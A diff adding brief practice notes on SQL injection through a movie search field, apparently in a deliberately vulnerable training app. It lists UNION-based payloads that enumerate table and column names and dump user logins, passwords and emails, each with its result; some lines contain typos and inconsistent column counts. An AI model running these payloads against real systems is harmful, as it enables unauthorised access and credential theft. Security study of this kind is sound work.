@@ -1,0 +1,17 @@
+#/SQL Injection GET/Search/
+#a single space after double hyphen is required
+
+test' OR 1=1-- 
+result: lists all movies
+
+test' UNION SELECT 1,1,1,1,1,1,1-- 
+result:returns a "movie" result with 1 in all fields rather than an error regarding column number
+
+test' UNION SELECT 1,IronMan,1,hacked,1,1-- 
+result: movie with the title Ironman and character hack
+
+1' and 1=2 UNION SELECT 1,1,coumn_name,table_name,1,1,1-- 
+result: release displays column_name, and genre displays table_name
+
+test' UNION SELECT 1,login,password,email,sercret,1,1 from users-- 
+result: displays user information for A.I.M and bee
